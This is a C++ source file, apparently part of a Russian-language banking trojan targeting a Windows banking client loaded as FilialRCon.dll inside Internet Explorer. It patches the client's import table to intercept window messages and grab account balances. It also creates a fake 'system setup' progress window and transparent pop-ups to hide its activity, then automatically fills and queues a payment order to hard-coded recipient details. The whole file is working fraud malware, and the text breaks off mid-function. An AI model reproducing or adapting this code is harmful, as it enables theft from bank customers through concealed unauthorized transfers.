#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"

#include "Utils.h"

#include "Inject.h"

#include "ntdll.h"

#include "commctrl.h"

#include "BotDebug.h"

namespace DBGRAFADLL
{
	#include "DbgTemplates.h"
}

#define DBGRAFA DBGRAFADLL::DBGOutMessage<>

#define RafaDllModule //говорим что модуль включен

namespace Rafa
{

LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);

WNDPROC MainWndProc; //оконная процедура главного окна клиента


//контрол формы, для автоматического заполнения формы данными
struct ControlForm
{
	const char* name; //условное имя контрола, для его идентификации в программе
	int x, y, w, h; //расположение контрола на форме (для поиска, изменять нельзя)
	const char* captionText;
	DWORD captionHash; //если хеш не указан, то ищем по captionText
	const char* classText;
	DWORD classHash;
};

//информация он найденном контроле
struct ControlFinded
{
	HWND wnd;
	ControlForm* info;
};

void GrabBalansFromMemoText(const char* s);
void GrabBalansFromLVM(const char* s);

HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
DWORD PID = 0; //для избежания 2-го запуска
int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabBalansFromLVM)
HWND treeView = 0, listView = 0, toolBar = 0;
int idBtNewDoc = 0;
POINT posBtNewDoc;
int stateFakeWindow = 0;

//контролы формы "Платежное поручение"
ControlForm controlsPaymentOrder[] = 
{
	{ "form",	 0, 0, 606, 569,  "Платёжное поручение", 0x505B8A7A, "Canvas",  0 },
	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //номер документа
	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* срочный */, 0, 0x5E9D34F9 /* button */}, //галочка срочный
	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //дата
	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //вид платежа
	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //статус составителя
	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //ИНН плательщика
	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП плательщика
	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //сумма
	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* НДС */, 0, 0x5E9D34F9 /* button */}, //кнопка НДС
	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //ИНН получателя
	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП получателя
	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //счет получателя
	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //наименование получателя
	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //БИК получателя
	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //банк получателя
	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //счет банка получателя
	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //населенный пункт получателя
	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //дата исполнения
	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //очередь платежа
	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //назначение платежа
	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* Сохранить */, 0, 0x5E9D34F9 /* button */}, //кнопка сохранить
	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* К отправке */, 0, 0x5E9D34F9 /* button */}, //галочка к отправке
	{ 0 }
};


//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );

static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
{
  PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(  ((PIMAGE_DOS_HEADER)Image)->e_lfanew +  (PCHAR)Image );
  if ( 	((PIMAGE_DOS_HEADER)Image)->e_magic != IMAGE_DOS_SIGNATURE )
	  return NULL;
  if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
	  return NULL;
  return pNtHeader;
};

static bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
{

	PIMAGE_NT_HEADERS		pNtHeader;
	PIMAGE_DATA_DIRECTORY	pData;
	CHAR buf1[MAX_PATH];

	if ( Module == NULL )
		return false;

	pNtHeader = GetNtHeaders(Module);
	if ( pNtHeader == NULL )
		return false;

	pData = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if ( pData->Size == 0 )
		return false;
	
	m_lstrcpy(buf1,DllName);
	pCharUpperBuffA(buf1,sizeof(buf1)-1);

	PIMAGE_IMPORT_DESCRIPTOR	pimg_import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)Module + pData->VirtualAddress);

	for ( int i =0; pimg_import_desc[i].Name != 0; ++i)
	{
		CHAR buf2[MAX_PATH];
		PCHAR ImortDll = (PCHAR)Module + pimg_import_desc[i].Name;
		m_lstrcpy(buf2,ImortDll);
		pCharUpperBuffA(buf2,sizeof(buf2)-1);
		if ( m_lstrcmp(buf1,buf2) != 0 )
			continue;

		DWORD  VAToThunk   = pimg_import_desc[i].FirstThunk;
		PDWORD FirstThunk  = (PDWORD)((PCHAR)Module + pimg_import_desc[i].FirstThunk);  /*VA to function*/
		PDWORD OriginalFirstThunk  =(PDWORD)((PCHAR)Module + pimg_import_desc[i].OriginalFirstThunk); /*VA to name function*/
		while ( *FirstThunk  && *OriginalFirstThunk )
		{
			PCHAR Name  = (PCHAR)((PCHAR)Module +*OriginalFirstThunk ); 
			Name+=2;

			if ( m_lstrcmp(Name,FuncName) == 0)
			{
				DWORD Protect;
				*OldHandler = (PVOID)*FirstThunk;
				pVirtualProtect(FirstThunk,sizeof(PVOID),PAGE_READWRITE,&Protect);
				*FirstThunk = (DWORD)NewHandler;
				pVirtualProtect(FirstThunk,sizeof(PVOID),Protect,&Protect);

				
				DBGRAFA( "Rafa", "IAT: [%s] %x", FuncName, *FirstThunk); 
				return true;
			}

			FirstThunk++;	OriginalFirstThunk++;
			VAToThunk += sizeof(VAToThunk);
		}
	}
	return false;
}

static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch ( Msg )
	{
		// весь остальной текст в том числе и из EDIT (в правом нижнем углу)
		case WM_SETTEXT:
			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
			GrabBalansFromMemoText((char*)lParam);
		break;

		// для дерева добавление item
		case TVM_INSERTITEM:
		{
			/*
			LPTVINSERTSTRUCT insert = (LPTVINSERTSTRUCT)lParam;
			if ( insert)
			if ( insert->item.mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_INSERTITEM: [%x] %s", hWnd, (insert->item.pszText==NULL)?"NULL":insert->item.pszText); 
			}
			*/
			break;
		}
		// для дерева модификация item
		case TVM_SETITEM:
		{
			/*
			LPTVITEM	item  = (LPTVITEM)lParam;
			if ( item )
			if ( item->mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_SETITEM: [%x] %s",hWnd,(item->pszText==NULL)?"NULL":item->pszText); 
			}
			*/
			break;
		}

		// для таблицы добавление item
		case LVM_INSERTITEM:
		{
			/*
			LPLVITEM item = (LPLVITEM)lParam;
			if ( item == NULL)
				break;
			if ( item->mask & LVIF_TEXT && item->pszText != LPSTR_TEXTCALLBACK )
			{
				DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
			}
			*/
			break;
		}
		// для таблицы  модификация item
		case LVM_SETITEM:
		{
			LPLVITEM item  = (LPLVITEM)lParam;
			if( item )
				if ( item->mask & LVIF_TEXT )
				{
					//DBGRAFA( "Rafa", " %s", item->pszText ); 
					GrabBalansFromLVM(item->pszText);
				}
			break;
		}
	}

	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
}

static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	LRESULT ret = MainWndProc( hWnd, Msg, wParam, lParam );
	switch ( Msg )
	{
		case WM_NOTIFY:
		{
			NMLVDISPINFOA *pdi = (NMLVDISPINFOA*)lParam;
			if( pdi->hdr.hwndFrom == listView && pdi->hdr.code == LVN_GETDISPINFO )
			{
				if( pdi->item.mask & LVIF_TEXT )
				{
					DBGRAFA( "Rafa*****", "i = %d,%d '%s'", pdi->item.iItem, pdi->item.iSubItem, pdi->item.pszText );
				}
			}
			break;
		}
	}
	return ret;
}

static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
{
	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
										 hWndParent, hMenu, hInstance, lpParam );
	
	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
	{
		bool transparent = false;
		DBGRAFA( "Rafa--", "'%s','%s'", lpWindowName, lpClassName );
		if( (stateFakeWindow & 3) == 3 ) //ждем появления окна ввода новой платежки
		{
			RECT r;
			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //это окно Платёжное поручение
			{
				transparent = true;
				stateFakeWindow &= ~2; //больше не нужно ждать это окно
			}
		}
		else
			if( (stateFakeWindow & 5) == 5 ) //во время ввода платежки, подавляем все всплывающие окна
			{
				transparent = true;
			}
		if( transparent ) //делаем окно прозрачным
		{
#ifdef DEBUGCONFIG
			SetWindowTransparent( hWnd, 50 );
#else
			SetWindowTransparent( hWnd, 0 );
#endif
		}
	}
	return hWnd;
}

static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
{
	DWORD hash = GetWndClassHash(wnd);
	if( pIsWindowVisible(wnd) )
	{
		if( hash == 0xEB4973EE /* SysTreeView32 */ )
		{
			treeView = wnd;
		}
		if( hash == 0xF06537E2 /* SysListView32 */ )
		{
			listView = wnd;
		}
		if( hash == 0xC1AFE727 /* ToolbarWindow32 */ )
		{
			TBBUTTON bt;
			for( int i = 0; i < 20; i++ )
			{
				m_memset( &bt, 0, sizeof(bt) );
				if( pSendMessageA( wnd, TB_GETBUTTON, (WPARAM)i, (LPARAM)&bt ) == FALSE ) break;
				char text[128];
				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
				if( CalcHash(text) == 0x8CBC9350 /* Новый документ */ )
				{
					toolBar = wnd;
					idBtNewDoc = bt.idCommand;
					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					posBtNewDoc.x = r.left;
					posBtNewDoc.y = r.top;
					break;
				}
			}
		}
	}
	return TRUE;
}

static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == (DWORD)lParam )
	{
		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //окно ИЕ в текущем процессе
		{
			IEWnd = wnd; //запоминаем окно ИЕ
			EnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
			if( treeView && listView ) //нашли нужные контролы (дерево слева и таблицу справа сверху)
			{
				return FALSE; //останавливаем поиск
			}
		}
	}
	return TRUE;
}

//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
{
	bool ok = false;
	//окно нужного класса
	if( cf->classHash && classHash ) //есть хеш имени класса, сравниваем по нему
	{
		if( classHash == cf->classHash )
			ok = true;
	}
	else 
	{
		if( cf->classText ) //есть имя класса, сравниваем по имени
		{
			if( className )
			{
				if( m_strstr( className, cf->classText ) )
					ok = true;
			}
		}
	}
	if( ok ) //класс окна совпал
	{
		ok = false;
		//сравнимаем по заголовку окна
		if( cf->captionHash && captionHash ) //есть хеш заголовка
		{
			if( captionHash == cf->captionHash )
				ok = true;
		}
		else
		{
			if( cf->captionText && caption ) //есть текст заголовка
			{
				if( m_strstr( caption, cf->captionText ) )
					ok = true;
			}
			else //заголовок не указан, сравниваем по координатам
			{
				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
					ok = true;
			}
		}
		if( ok ) //параметры окна совпали
			return true;
	}
	return false;
}

static void GetControlRect( HWND parent, HWND wnd, RECT& r )
{
	pGetWindowRect( wnd, &r );
	//преобразовываем в координаты окна предка
	POINT p;
	p.x = r.left; p.y = r.top;
	pScreenToClient( parent, &p );
	r.right = p.x + r.right - r.left;
	r.bottom = p.y + r.bottom - r.top;
	r.left = p.x;
	r.top = p.y;
}

static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
{
	char* caption = GetWndText(wnd);
	char* className = GetWndClassName(wnd);
	RECT r;
	GetControlRect( parent, wnd, r );
	bool res = CmpWnd( caption, CalcHash(caption), className, STR::GetHash( className, 0, true ), r, cf );
	STR::Free(caption);
	STR::Free(className);
	return res;
}

//-----------------------------------------------------------------
//вспомогательная функция для поиска форм на окне ИЕ
static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == PID )
	{
		ControlFinded* cf = (ControlFinded*)lParam;
		if( CmpWnd( wnd, wnd, cf->info ) )
		{
			cf->wnd = wnd;
			return FALSE;
		}
	}
	return TRUE;
}

//ищет нужную нам форму в дочерних окнах ИЕ
static HWND FindForm( ControlForm* form )
{
	ControlFinded cf;
	cf.wnd = 0;
	cf.info = form;
	pEnumChildWindows( 0 /*IEWnd*/, EnumFindForm, (LPARAM)&cf );
	return cf.wnd;
}
//--------------------------------------------------------------------------
struct ForFindControls
{
	ControlForm* cfIn;
	ControlFinded* cfOut;
	int countOut; //сколько найдено
	HWND parent;
};

//вспомогательная функция для поиска контролов на форме
static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
{
	if( pIsWindowVisible(wnd) )
	{
		ForFindControls* ffc = (ForFindControls*)lParam;
		ControlForm* pcf = ffc->cfIn;
		char* caption = GetWndText(wnd);
		char* className = GetWndClassName(wnd);
		DWORD captionHash = CalcHash(caption);
		DWORD classHash = STR::GetHash( className, 0, true );
		RECT r;
		GetControlRect( ffc->parent, wnd, r );

		DBGRAFA( "Rafa", "%s %s", caption, className );
		while( pcf->name )
		{
			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
			{
				//на всякий случай смотрим, чтобы по одному описанию не нашлю несколько окон
				int i = 0;
				for( ; i < ffc->countOut; i++ )
					if( ffc->cfOut[i].info == pcf )
						break;
				if( i >= ffc->countOut )
				{
					ffc->cfOut[ffc->countOut].info = pcf;
					ffc->cfOut[ffc->countOut].wnd = wnd;
					ffc->countOut++;
					DBGRAFA( "Rafa", "finded %s", pcf->name );
					break;
				}
			}
			pcf++;
		}

		STR::Free(caption);
		STR::Free(className);
	}
	return TRUE;
}

//ищет контролы на форме parent по описанию в массиве cfIn, результат записывается в cfOut и возвращает функция количество найденных
//контролов. Массив cfOut должен выделен на тоже количество элементов что и cfIn
static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
{
	ForFindControls ffc;
	ffc.cfIn = cfIn;
	ffc.cfOut = cfOut;
	ffc.countOut = 0;
	ffc.parent = parent;
	pEnumChildWindows( parent, EnumFindControls, (LPARAM)&ffc );
	return ffc.countOut;
}

//------------------------------------------------------------------------------------------------------------

static bool FindTreeList()
{
	treeView = listView = 0;
	DWORD pid = GetUniquePID();
	pEnumWindows( EnumTopWindows, (LPARAM)pid );
	if( treeView && listView )
		return true;
	return false;
}

static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
{
	TVITEMEX infoItem;
    m_memset( &infoItem, 0, sizeof(infoItem) );
    infoItem.mask = TVIF_TEXT | TVIF_HANDLE;
    infoItem.hItem = item;
    infoItem.pszText = buf;
    infoItem.cchTextMax = szBuf;
    buf[0] = 0;
    if( pSendMessageA( treeView, TVM_GETITEM, (WPARAM)0, (LPARAM)&infoItem ) )
		return buf;
	return 0;
}

//ищем "платежное поручение"->"Шаблоны", возвращаем item Шаблоны
static HTREEITEM FindPaymentOrder( HTREEITEM item )
{
	char text[256];
	do
	{
		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
		{
			HTREEITEM child = 0;
			//после разворачивания дерева, ветки могут не сразу появиться, поэтому ждем пока появятся
			for( int i = 0; i < 20; i++ )
			{
				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
				if( child != 0 ) break;
				pSleep(500);
			}
			if( child )
			{
				if( GetTextTreeItem( item, text, sizeof(text) ) )
				{
					DWORD hash = CalcHash(text);
					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
					{
						//смотрим есть ли в подветках Шаблоны
						HTREEITEM item2 = child;
						do
						{
							if( GetTextTreeItem( item2, text, sizeof(text) ) )
							{
								if( m_strstr( text, "Шаблоны" ) )
								{
									return item2;
								}
							}
							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
						}
						while(item2);
					}
				}
				HTREEITEM res = FindPaymentOrder(child);
				if( res )
					return res;
			}
		}
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
	} while( item );
	return 0;
}

//сворачивает указанное количество веток дерева
static void TreeViewCollapse( HTREEITEM item, int count )
{
	while( count-- )
	{
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
		if( item == 0 ) break;
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
	}
}

static int FindNewPaymentOrder()
{
	int index = -1;
	char text[256];
	for(;;)
	{
		index = (int)pSendMessageA( listView, LVM_GETNEXTITEM, (WPARAM)index, MAKELPARAM(LVNI_ALL, 0) );
		if( index < 0 ) break;
		LVITEM item;
		m_memset( &item, 0, sizeof(item) );
		item.pszText = text;
		item.cchTextMax = sizeof(text);
		item.iSubItem = 6; //именно в 6-м находится наименование шаблона
		text[0] = 0;
		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
		DWORD hash = CalcHash(text);
		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
		if( hash == 0x6C433B30 /* НОВОЕ ПЛАТЕЖНОЕ ПОРУЧЕНИЕ */ )
		{
			break;
		}
	}
	return index;
}

//ищет контрол среди найденых на форме по его имени
static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
{
	for( int i = 0; i < count; i++ )
	{
		if( m_lstrcmp( name, cf[i].info->name ) == 0 )
			return &cf[i];
	}
	return 0;
}

//пишет текст в контрол на форме
static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		if( s )
			pSetWindowTextA( ctrl->wnd, s );
		if( sendChars )
		{
			while( *sendChars )
			{
				SendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
				sendChars++;
			}
		}
		return true;
	}
	return false;
}

static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		pSendMessageA( ctrl->wnd, BM_SETCHECK, (WPARAM) check ? BST_CHECKED : BST_UNCHECKED, (LPARAM)0 );
		return true;
	}
	return false;
}

static bool ClickButton( const char* name, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		HardClickToWindow( ctrl->wnd, 5, 5 );
		return true;
	}
	return false;
}

//Создает окно с прогресс баром, которое скрывает под собой все окна
static DWORD WINAPI FakeWindow( LPVOID p )
{
	HWND parent = (HWND)p;
	HINSTANCE inst = (HINSTANCE)pGetModuleHandleA(NULL);
	RECT r, r2;
	pGetClientRect( parent, &r ); //область которую нужно закрыть
	POINT pp;
	pp.x = 0;
	pp.y = 0;
	//узнаем координаты области на экране
	pClientToScreen( parent, &pp ); 
	int xFW = pp.x, yFW = pp.y;
	int wFW = r.right, hFW = r.bottom;
	//рассчитываем положение прогресс бара на новом окне
	int wPB = r.right * 80 / 100;
	int hPB = 25;
	int xPB = (r.right - wPB) / 2;
	int yPB = (r.bottom - hPB) / 2;
	//создаем скрывающее окно
	HWND fakeWindow = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );

	if( !fakeWindow )
      return 0; 
	//окно в котором печатается текст
	HWND warnWnd = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
	//сам текст пишем в статус баре, чтобы был нормальный фон и цвет текста
	HWND warnText = (HWND)CreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
	//статус бар справа рисует треугольник, это окно его скрывает
	HWND warnWnd2 = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
	//создаем сам прогресс бар
	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );

	pShowWindow( fakeWindow, SW_SHOW );
	pUpdateWindow(fakeWindow);
	//устанавливаем таймер для инкримента в статус баре
	pSetTimer( fakeWindow, 1, 500, 0 );
	//настраиваем статус бар
	pSendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 60 )); 
	pSendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
	MSG msg;
	int remain = 60;
	//запоминаем положение окна
	pGetWindowRect( parent, &r2 );
	r.left = r2.left;
	r.top = r2.top;
	r.right = r2.right;
	r.bottom = r2.bottom;

	//прогоняем в потоке сообщения и реагируем только на свой таймер
	while( (stateFakeWindow & 1) && pGetMessageA( &msg, 0, 0, 0 ) )
	{
		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //наш таймер
		{
			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
			if( --remain == 0 )
				break;
		}
	    pTranslateMessage( &msg );
		pDispatchMessageA( &msg );
		//проверяем не изменило ли свое положение или размеры окно которое скрываем
		pGetWindowRect( parent, &r2 );
		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
		{
			//если изменило, то подгоняем наше окно под предка
			r.left = r2.left;
			r.top = r2.top;
			r.right = r2.right;
			r.bottom = r2.bottom;
			pGetClientRect( parent, &r2 );
			pp.x = 0;
			pp.y = 0;
			pClientToScreen( parent, &pp );
			pMoveWindow( fakeWindow, pp.x, pp.y, r2.right, r2.bottom, TRUE );
		}
	}
	pDestroyWindow(fakeWindow);
	return true;
}

//сюда попадаем когда найдены контролы TreeView и ListView окна банка
static void WorkInRafa()
{
	HWND parent = (HWND)pGetParent(treeView);
	//подменяем оконную процедуру главного окна, для перехвата нотификационніх сообщений
	MainWndProc = (WNDPROC)SetWindowLongPtr( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
	stateFakeWindow = 1; //запуск окна скрывающего наши действия
	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
	pCloseHandle(hThread);

	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
	if( root )
	{
		HTREEITEM tmpls = 0;
		//находим пункт Шаблоны, делаем несколько попыток, так как не сразу все загружается
		for( int i = 0; i < 10; i++ )
		{
			tmpls = FindPaymentOrder(root); 
			pSleep(1000);
		}
		if( tmpls )
		{
			if( pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)tmpls ) )
			{
				DBGRAFA( "Rafa", "Шаблоны выбраны" );
				int indList = -1;
				for( int i = 0; i < 10; i++ )
				{
					indList = FindNewPaymentOrder();
					if( indList >= 0 ) break;
					pSleep(1000);
				}
				if( indList >= 0 )
				{
					DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
					POINT posItem;
					pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
					stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
					HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
					DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
					FindTreeList();
					if( toolBar )
					{
						HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
						DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
						//ждем появления формы ввода платежа
						HWND formPayment = 0;
						for( int i = 0; i < 10; i++ )
						{
							formPayment = FindForm( &controlsPaymentOrder[0] );
							if( formPayment ) break;
							pSleep(1000);
						}
						if( formPayment )
						{
							DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
							stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
							//ищем контролы в которые будем вводить
							ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
							int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
							if( countControls ) //нашли нужные контролы, теперь заполняем
							{
								DBGRAFA( "Rafa", "Заполняем контролы" );
								//SetText( "num", "1", cf, countControls );
								//SetText( "status", "2", cf, countControls );
								SetText( "sum", "1", cf, countControls );
								SetText( "innrecv", "7705401519", cf, countControls );
								SetText( "kpprecv", "770501001", cf, countControls );
								SetText( "accountrecv", "40703810500", cf, countControls );
								SetText( "namerecv", "Благотворительный Фонд 'СОЗИДАНИЕ'", cf, countControls );
								SetText( "bikrecv", "044525225", cf, countControls );
								SetText( "bankrecv", "Сбербанка России", cf, countControls );
								SetText( "accbankrecv", "30101810400", cf, countControls );
								SetText( "punktrecv", "Moscow", cf, countControls );
								SetText( "comment", "помощь детям", cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
								SetButtonCheck( "sended", true, cf, countControls );
								//сохраняем платежку
								ClickButton( "save", cf, countControls );
								pSleep(5000); //ждем пока сохранится
								//сворачиваем дерево до первоначального состояния
								TreeViewCollapse( tmpls, 4 );
								pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
							}
							HEAP::Free(cf);
						}
						else
							DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
					}
				}
			}
		}
		else
			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
	}
	stateFakeWindow = 0; //закрываем окно скрытия
}

static DWORD WINAPI InitializeRafaHook( LPVOID p )
{
	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
	while( true )
	{
		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
		if( dll )
		{
			bool hookDll = false;
			for( int i = 0; i < 10; i++ )
			{
				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
				if( res )
				{
					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
					hookDll = true;
					break;
				}
				pSleep(1000);
			}
			if( !hookDll ) break;
			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
			for( int i = 0; i < 300; i++ )
			{
				if( FindTreeList() )
				{
					DBGRAFA( "Rafa", "Find TreeView and ListView" );
					WorkInRafa(); 
					return 0;
				}
				pSleep(1000);
			}
		}
		pSleep(1000);
	}
	return 0;
}

void InitHook_FilialRConDll()
{
	if( IsNewProcess(PID) ) //чтобы повторно не запустить
	{
		HANDLE hThread = pCreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
		pCloseHandle(hThread);
